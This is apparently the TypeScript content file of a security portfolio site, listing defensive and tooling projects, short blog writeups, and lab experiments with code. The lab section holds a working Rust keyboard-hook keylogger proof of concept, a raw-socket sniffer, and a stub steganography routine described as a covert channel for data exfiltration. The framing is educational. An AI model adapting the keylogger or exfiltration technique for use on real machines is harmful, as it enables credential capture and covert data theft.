export interface Project {
  slug: string;
  title: string;
  category: "OFFENSIVE" | "DEFENSIVE" | "ENGINEERING";
  year: string;
  description: string;
  fullDescription: string;
  tags: string[];
  links: {
    demo?: string;
    repo?: string;
    caseStudy?: string;
  };
  build: {
    stack: string[];
    features: string[];
  };
  secure: {
    measures: string[];
  };
  problem: string;
  solution: string[];
  proof: string[];
}

export const projects: Record<string, Project> = {
  "mehr-guard": {
    slug: "mehr-guard",
    title: "Mehr Guard",
    category: "DEFENSIVE",
    year: "2024",
    description: "Privacy-first offline QR & URL security scanner built with Kotlin Multiplatform. 100% offline analysis with 5 platform targets.",
    tags: ["KMP", "Security Tool", "Android", "iOS", "Desktop", "Web"],
    links: {
      demo: "https://www.youtube.com/watch?v=n8bheouj4jM",
      repo: "https://github.com/Raoof128/Raoof128.github.io",
      caseStudy: "/projects/mehr-guard"
    },
    build: {
      stack: ["Kotlin Multiplatform", "Compose Multiplatform", "SwiftUI", "ML Kit", "SQLDelight"],
      features: [
        "5 Platform Targets (Android, iOS, JVM, JS, Wasm)",
        "Ensemble ML Model (Logistic Regression + Gradient Boosting)",
        "Heuristics Engine (25+ checks)",
        "Red Team Mode for verification"
      ]
    },
    secure: {
      measures: [
        "100% Offline Analysis (Zero network calls)",
        "On-device ML & Heuristics",
        "No data collection",
        "Privacy by Architecture"
      ]
    },
    fullDescription: "Mehr Guard is a privacy-first QR code and URL security scanner built with Kotlin Multiplatform. It detects phishing attacks, brand impersonation, and malicious redirects entirely on-device.",
    problem: "QR codes are a common vector for phishing, but most scanners upload data to the cloud, compromising privacy. Users need a way to verify URLs without leaking their browsing history.",
    solution: [
      "Built a 100% offline analysis engine using Kotlin Multiplatform",
      "Implemented an ensemble ML model + 25 heuristics for high accuracy",
      "Targeted 5 platforms (Android, iOS, Desktop, Web) with ~52% code sharing",
      "Achieved <5ms latency for real-time scanning"
    ],
    proof: [
      "F1 Score: 87% on red team corpus",
      "Performance: <5ms P99 latency",
      "Privacy: Verified 0 network calls via ./judge/verify_offline.sh",
      "Code Sharing: ~100% shared detection logic"
    ]
  },
  "gitswitch": {
    slug: "gitswitch",
    title: "GitSwitch",
    category: "ENGINEERING",
    year: "2024",
    description: "AI-powered Git client for managing multiple identities and generating semantic commits. Built with Electron and React.",
    tags: ["Electron", "React", "TypeScript", "AI", "Dev Tool"],
    links: {
      repo: "https://github.com/Raoof128/GitSwitch",
      caseStudy: "/projects/gitswitch"
    },
    build: {
      stack: ["Electron", "React 19", "TypeScript", "Zustand", "Google Gemini AI"],
      features: [
        "Multi-Account Management (Personal, Work)",
        "AI Commit Generation (Gemini 3)",
        "Smart Diff Viewer with syntax highlighting",
        "Drag & Drop repository management"
      ]
    },
    secure: {
      measures: [
        "API keys redacted from logs & wiped from memory",
        "Secure OS-keychain storage for secrets",
        "Enforced timeouts & input sanitization",
        "Privacy First design"
      ]
    },
    fullDescription: "Gitswitch is a modern, AI-powered Git client designed for developers who manage multiple accounts and repositories. It offers a seamless experience for switching identities and generating semantic commit messages.",
    problem: "Developers often struggle with managing multiple git identities (personal vs work) and writing consistent commit messages.",
    solution: [
      "Created a seamless identity switcher for global/local git config",
      "Integrated Gemini 3 AI for semantic commit generation",
      "Built a secure, modern Electron app with strict isolation",
      "Implemented smart diff viewing for better code review"
    ],
    proof: [
      "Secure OS-keychain integration",
      "Memory wiping for API keys",
      "React 19 + Electron 33 modern stack",
      "Cyberpunk-inspired UI"
    ]
  },
  "ecrsm": {
    slug: "ecrsm",
    title: "ECRSM",
    category: "OFFENSIVE",
    year: "2025",
    description: "Synthetic, read-only runtime visibility stack combining kernel eBPF, Go agent, and React dashboard. Educational runtime monitor.",
    tags: ["eBPF", "Go", "React", "Kernel", "Runtime Security"],
    links: {
      repo: "https://github.com/Raoof128/ECRSM",
      caseStudy: "/projects/ecrsm"
    },
    build: {
      stack: ["eBPF (C)", "Go (Agent)", "React (Dashboard)", "Kubernetes (Helm)"],
      features: [
        "Kernel tracepoints (execve, connect, ptrace, mmap)",
        "Go agent for enrichment & rules",
        "Live WebSocket dashboard",
        "Kubernetes DaemonSet deployment"
      ]
    },
    secure: {
      measures: [
        "Read-only introspection (no kernel writes)",
        "Metadata only (no payloads/secrets)",
        "Least privilege (BPF/SYS_ADMIN caps only)",
        "Safe synthetic simulations"
      ]
    },
    fullDescription: "ECRSM is an educational eBPF-based Cloud Runtime Security Monitor. It provides a synthetic, read-only runtime visibility stack combining kernel eBPF, a Go agent, and a React dashboard.",
    problem: "Understanding runtime security at the kernel level is complex. ECRSM provides a safe, educational platform to learn eBPF-based monitoring.",
    solution: [
      "Implemented eBPF hooks for safe syscall tracepoints",
      "Built a Go agent to collect and enrich metadata",
      "Created a real-time React dashboard for visualization",
      "Designed safe synthetic attack simulations"
    ],
    proof: [
      "Detects reverse shells, process injection, suspicious execs",
      "Low-overhead perf buffer data transmission",
      "Container/K8s metadata enrichment",
      "Verifiable via synthetic attack scripts"
    ]
  }
};

export interface Writeup {
  slug: string;
  title: string;
  date: string;
  tag: string;
  takeaway: string;
  content: string; // Markdown content
}

export const writeups: Writeup[] = [
  {
    slug: "ecrsm-deep-dive",
    title: "Deep Dive: eBPF Runtime Monitoring",
    date: "2025-01-15",
    tag: "eBPF",
    takeaway: "How to build safe, read-only kernel probes for container security.",
    content: `
## Introduction

eBPF (Extended Berkeley Packet Filter) has revolutionized Linux kernel observability. It allows us to run sandboxed programs in the kernel without changing kernel source code or loading modules.

In this deep dive, I'll explain how **ECRSM** uses eBPF tracepoints to monitor system calls like \`execve\` and \`connect\` to detect suspicious behavior in real-time.

### The Architecture

1.  **Kernel Space**: C programs attached to tracepoints.
2.  **User Space**: A Go agent that loads the maps and polls the perf buffer.
3.  **Visualization**: A React dashboard receiving events via WebSockets.

### Safety First

Writing to the kernel is dangerous. ECRSM strictly uses **read-only** tracepoints. We never modify packet data or syscall arguments, ensuring system stability is never compromised.
    `
  },
  {
    slug: "kmp-security",
    title: "Building Offline-First Security Tools with KMP",
    date: "2025-01-02",
    tag: "Kotlin",
    takeaway: "Sharing 100% of security logic across Android, iOS, and Web.",
    content: `
## Why Kotlin Multiplatform?

For security tools, consistency is key. If your iOS app uses a different regex for phishing detection than your Android app, you have a security gap.

**MehrGuard** solves this by sharing 100% of its domain logic using Kotlin Multiplatform (KMP).

### What We Share

*   **Heuristics Engine**: The core logic that scores URLs.
*   **Allow/Deny Lists**: Centralized management of threat intelligence.
*   **Networking Logic**: (Or lack thereof, since it's offline).

### The Result

We achieved ~52% code sharing across 5 platforms, meaning a single developer can audit the security core once and deploy fixes everywhere instantly.
    `
  },
  {
    slug: "electron-security",
    title: "Securing Electron Apps: A Practical Guide",
    date: "2024-12-20",
    tag: "Electron",
    takeaway: "Handling secrets and IPC securely in modern desktop apps.",
    content: `
## The Electron Security Problem

Electron apps are essentially web pages with Node.js access. This is a terrifying combination if not sandboxed correctly.

### Critical Defenses in GitSwitch

1.  **Context Isolation**: Enabled. This ensures the preload script runs in a separate context.
2.  **Sandbox**: Enabled. Renderers have no Node.js access.
3.  **IPC Security**: We use strict \`ipcMain.handle\` and \`ipcRenderer.invoke\` patterns with validated channels.

### Handling Secrets

Never store secrets in \`localStorage\`. GitSwitch uses the OS native Keychain (via \`keytar\`) to store GitHub Personal Access Tokens, ensuring they are encrypted at rest.
    `
  }
];

export interface LabExperiment {
  id: string;
  title: string;
  status: "ACTIVE" | "ARCHIVED" | "CONCEPT";
  description: string;
  tech: string[];
  link?: string;
  objective: string;
  constraints: string;
  codeSnippet: string;
}

export const labExperiments: LabExperiment[] = [
  {
    id: "001",
    title: "Rust Keylogger PoC",
    status: "ARCHIVED",
    description: "A Windows-based keylogger demonstrating the usage of `SetWindowsHookEx` and proper hook chaining for educational detection analysis.",
    tech: ["Rust", "WinAPI", "Unsafe"],
    link: "https://github.com/Raoof128",
    objective: "Understand how Windows messaging hooks can be abused for credential interception and how EDRs detect hook injection.",
    constraints: "Educational purpose only. Does not persist across reboots. Logs to stdout only.",
    codeSnippet: `
// WinAPI Hook Structure (Simplified)
unsafe extern "system" fn hook_callback(code: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT {
    if code >= 0 && wParam.0 as u32 == WM_KEYDOWN {
        let kbd_struct = *(lParam.0 as *const KBDLLHOOKSTRUCT);
        // Process virtual key code
        println!("Key Intercepted: {}", kbd_struct.vkCode);
    }
    // Always pass to next hook in chain to avoid breaking input
    CallNextHookEx(HOOK_HANDLE, code, wParam, lParam)
}

fn main() {
    let hook_id = unsafe {
        SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            std::ptr::null_mut(),
            0
        )
    };
    // Pump messages to keep hook alive
    let mut msg = MSG::default();
    while unsafe { GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) } > 0 {
        unsafe {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
}`
  },
  {
    id: "002",
    title: "Raw Socket Packet Sniffer",
    status: "ACTIVE",
    description: "Python script utilizing raw sockets to capture and analyze TCP/IP headers. Implements basic signature matching for identifying SYN scans.",
    tech: ["Python", "Networking", "Scapy"],
    link: "https://github.com/Raoof128",
    objective: "Manually parse IP/TCP headers to understand protocol structures and detect scanning patterns without relying on Wireshark.",
    constraints: "Requires root/admin privileges. Promiscuous mode enabled.",
    codeSnippet: `
import socket
import struct

def sniff():
    # Create a raw socket bound to all interfaces
    # AF_PACKET is Linux specific. For Windows use AF_INET + IP_HDRINCL
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    
    while True:
        raw_data, addr = s.recvfrom(65535)
        eth_header = raw_data[:14]
        
        # Unpack Ethernet Frame
        dest, src, proto = struct.unpack('! 6s 6s H', eth_header)
        
        # Check for IPv4 (0x0800)
        if socket.ntohs(proto) == 8:
            ip_header = raw_data[14:34]
            # Unpack IP Header (Version, IHL, TTL, Protocol, Source, Dest)
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
            
            version_ihl = iph[0]
            ihl = version_ihl & 0xF
            
            print(f"Packet: {addr} | IHL: {ihl} | Protocol: {iph[6]}")
`
  },
  {
    id: "003",
    title: "Steganography Tool",
    status: "CONCEPT",
    description: "LSB (Least Significant Bit) image steganography implementation in Go. Hides encrypted payloads within PNG pixel data.",
    tech: ["Go", "Cryptography", "Image Processing"],
    link: "https://github.com/Raoof128",
    objective: "Implement a covert channel for data exfiltration by modifying the least significant bits of image pixel data.",
    constraints: "Payload size limited by image dimensions. Not robust against compression.",
    codeSnippet: `
package main

import (
	"image"
	"image/color"
)

// EmbedHides payload bits into the LSB of image pixels
func Embed(img image.Image, payload []byte) image.Image {
	bounds := img.Bounds()
	newImg := image.NewRGBA(bounds)
    
    // ... bit manipulation logic ...
    
	for y := bounds.Min.Y; y < bounds.Max.Y; y++ {
		for x := bounds.Min.X; x < bounds.Max.X; x++ {
			r, g, b, a := img.At(x, y).RGBA()
            
            // Modify 'r' (red channel) LSB with payload bit
            // r = (r & 0xFE) | next_bit
            
			newImg.Set(x, y, color.RGBA{uint8(r), uint8(g), uint8(b), uint8(a)})
		}
	}
	return newImg
}`
  }
];